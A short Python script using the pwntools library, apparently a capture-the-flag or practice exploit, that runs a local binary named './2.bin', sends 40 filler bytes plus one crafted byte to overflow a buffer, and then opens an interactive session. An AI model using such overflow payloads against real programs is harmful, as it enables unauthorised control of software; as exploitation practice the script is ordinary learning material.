
from pwn import *

p = process("./2.bin")

p.send(b"A"*40 + b"\x69")

p.interactive()
